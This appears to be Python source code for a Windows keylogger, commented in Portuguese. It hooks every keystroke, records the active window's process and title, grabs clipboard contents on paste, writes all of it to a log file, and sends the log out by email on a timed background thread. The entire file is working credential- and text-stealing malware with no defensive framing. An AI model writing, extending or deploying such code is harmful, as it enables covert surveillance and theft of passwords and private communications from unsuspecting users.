from os import system
from threading import Thread
from time import sleep
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
from funcoes import *
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

# --------------PARAMETROS INICIAIS DO EMAIL-------------
conf = {}
try:	# Python >= 3.5
	execfile('conf.py', conf)
except NameError:	# Python < 3.5
	exec(open('conf.py').read(), conf)
# -------------------------------------------------------
def get_current_process():

	#1 handle para janela em primeiro plano
	hwnd = user32.GetForegroundWindow()

	#2 descobre id do processo
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))

	#2 armazena id do processo corrente
	process_id = "%d" % pid.value

	#2 obtem exe
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid) # abre processo e ve (noem) do exe

	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

	#le titulo
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title),512)
	#exibe cabecalho
	print
	print("[PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
	atualiza_arquivo("\n--------\n[PID: %s - %s - %s ]\n" % (process_id, executable.value, window_title.value))
	print

	#fecha handle
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

def KeyStroke(event): 

	global current_window

	# verifica se houve mudanca de janela
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_process()

	# se tecla padrao for pressionada
	if event.Ascii > 32 and event.Ascii < 127:
		print(chr(event.Ascii)),
		atualiza_arquivo(chr(event.Ascii))
	else:
		# copia event do CrtlV, se for o caso
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			print ("[PASTE] - %s " % (pasted_value)),
			atualiza_arquivo("[PASTE] - %s " % (pasted_value))
		elif event.Key == conf['commandToClose']:# FUNCAO PARA FECHAR O PROGRAMA
			atualiza_arquivo('\nFIM DA EXECUCAO')
			system('taskkill /IM pythonw.exe /F')
			system('taskkill /IM python.exe /F')
		else:
			print ("[%s]" % event.Key),
			atualiza_arquivo(" ")

	# passa para proximo hook
	return True

def serafina():
	while True:
		enviar_email(conf)
		sleep(conf['time_sleep']) # tempo em segundos

# inicia a thread para enviar email de (conf.time_sleep) em (conf.time_sleep) tempo
th = Thread(target=serafina)
th.start()

# cria e gerencia gerenciador de hook
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# registra e executa indefinidamente
kl.HookKeyboard()
pythoncom.PumpMessages()

